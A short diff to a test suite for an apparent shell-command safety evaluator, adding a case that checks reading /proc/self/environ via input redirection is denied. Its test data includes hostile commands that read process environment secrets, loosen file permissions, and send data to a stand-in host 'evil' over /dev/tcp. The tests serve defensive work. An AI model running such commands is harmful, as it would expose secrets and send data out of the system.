@@ -94,6 +94,8 @@ describe("pipeline integration — deny", () => {
     expect(quickEval("chmod 777 file")).toBe("deny"));
   test("denies /proc access", () =>
     expect(quickEval("cat /proc/self/environ")).toBe("deny"));
+  test("denies /proc access via input redirection", () =>
+    expect(quickEval("cat < /proc/self/environ")).toBe("deny"));
   test("denies /dev/tcp", () =>
     expect(quickEval("echo data > /dev/tcp/evil/80")).toBe("deny"));
 
